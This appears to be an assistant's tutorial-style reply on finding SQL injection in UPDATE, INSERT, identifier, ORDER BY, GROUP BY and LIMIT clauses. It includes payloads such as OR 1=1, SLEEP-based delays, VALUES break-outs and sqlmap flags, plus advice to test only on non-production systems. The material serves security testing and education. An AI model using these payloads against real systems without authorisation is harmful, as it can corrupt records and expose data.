Excellent addition. You've highlighted a critical point that many testers overlook: **SQL injection isn't just about the WHERE clause**.

Let me expand on each of those locations with concrete examples and detection techniques.

## 1. UPDATE Statements – Two Injection Points

### A. Within updated values (SET clause)
```sql
UPDATE users SET password = 'injected_value' WHERE username = 'admin'
```
- **Injection example:** `' OR 1=1 --` as the new password
- **Impact:** Can modify multiple rows, bypass logic, or trigger blind boolean conditions
- **Detection:** Submit `'` in a form field that updates a profile (e.g., "Change email"). Look for database errors or unexpected updates.

### B. Within the WHERE clause
```sql
UPDATE products SET price = 99 WHERE id = 'injected_value'
```
- **Injection example:** `1 OR 1=1` as the product ID
- **Impact:** Updates every row, not just the intended one
- **Detection:** Try `id=1 AND 1=2` vs `id=1 AND 1=1` – if different numbers of rows update, you have injection.

## 2. INSERT Statements – Two Injection Points

### A. Within inserted values
```sql
INSERT INTO users (username, email) VALUES ('injected', 'injected@x.com')
```
- **Injection example:** `admin', 'admin@x.com') --` as the username
- **Impact:** Can break out of the VALUES list, add extra rows, or trigger time delays
- **Detection:** Register a new user with username `' OR SLEEP(5) --` – watch for delays.

### B. Subquery injection (less common but dangerous)
```sql
INSERT INTO logs (message) VALUES ((SELECT password FROM users WHERE username='admin'))
```
- **Impact:** Leaks data from other tables into visible fields

## 3. SELECT Statements – Table or Column Names

Unlike value injection, **metadata injection** requires different syntax because column/table names can't be quoted normally.

### Example:
```sql
SELECT username, password FROM users WHERE id = 1 ORDER BY 'injected'
```

But table/column name injection typically looks like:
```sql
SELECT * FROM injected_table WHERE injected_column = 1
```

**Detection payloads:**
- **For column name:** `ORDER BY (SELECT username FROM users)` – if error changes, you may control column names
- **For table name:** `FROM users UNION SELECT ...` – but this requires breaking the query structure

**Key difference:** You often need to use backticks (MySQL) or double quotes (PostgreSQL) for identifiers, not single quotes for strings.

**Test example:**
```sql
-- Original
SELECT * FROM products WHERE category = 'electronics'

-- Testing column name injection (if parameter controls column)
SELECT * FROM products WHERE category = 'electronics' ORDER BY injected_param
-- Try: price ASC -- (valid column) vs pricexxx ASC -- (invalid)
-- Different responses? You may have control.
```

## 4. ORDER BY Clause – Often Forgotten

This is **extremely common** in search/sort functionality.

### Example:
```sql
SELECT name, price FROM products ORDER BY user_input
```

### Detection payloads:
| Payload | Expected behavior if vulnerable |
|---------|--------------------------------|
| `CASE WHEN 1=1 THEN price ELSE name END` | Sorts by price (normal) |
| `CASE WHEN 1=2 THEN price ELSE name END` | Sorts by name (different order) |
| `(SELECT CASE WHEN (1=1) THEN price ELSE (SELECT 1 UNION SELECT 2) END)` | Blind boolean – different sort order |
| `RANDOMBLOB(100000000)` | Time delay (heavy operation) |
| `(SELECT SLEEP(5))` | Time delay if database supports subqueries in ORDER BY |

### Real-world test for ORDER BY injection:
```http
GET /products?sort=price HTTP/1.1
```
Try:
1. `sort=price ASC, (SELECT SLEEP(5))` – watch for delay
2. `sort=(CASE WHEN 1=1 THEN price ELSE name END)` – compare with `WHEN 1=2`
3. `sort=price AND 1=1` – if error disappears with `AND 1=2`, you have injection

## Detection Matrix by Location

| Query part | Typical test payload | What to observe |
|------------|---------------------|-----------------|
| UPDATE SET | `', email='hacked@x.com' --` | Error or extra email field updated |
| UPDATE WHERE | `id=1 OR 1=1` | Multiple rows affected |
| INSERT VALUES | `'), ('admin2', 'pwd') --` | Extra row inserted |
| Column name | `price` vs `nonexistent` | Different error messages |
| Table name | `users` vs `nonexistent` | Different error messages |
| ORDER BY | `CASE WHEN 1=1 THEN id ELSE name END` vs `WHEN 1=2` | Different sort order |
| GROUP BY | `HAVING 1=1` vs `HAVING 1=2` | Different result sets |
| LIMIT | `LIMIT 1 OFFSET (SELECT SLEEP(5))` | Time delay |

## Automated Testing Considerations

Most scanners (including Burp Scanner) focus heavily on WHERE clause injection. For other locations:

- **sqlmap** with `--level=5` and `--risk=3` tests more locations, including ORDER BY
- **Manual testing** is often required for UPDATE/INSERT injection because they need state-changing requests (POST forms, profile edits)
- **For ORDER BY:** Use `sqlmap --technique=B` (boolean blind) with `--prefix=" " --suffix=" -- "`

## Critical Reminder

When testing UPDATE or INSERT statements:
- **Use a test account** – you might corrupt real data
- **Roll back transactions** if possible (wrap tests in `BEGIN; ... ROLLBACK;`)
- **For time-based testing**, use benign payloads that don't change actual data (e.g., `SLEEP(5)` in a subquery that isn't stored)

The most dangerous injection you listed is **UPDATE WHERE** – a single `OR 1=1` can wipe or modify every record in a table. Always test this on non-production systems or isolated test accounts.
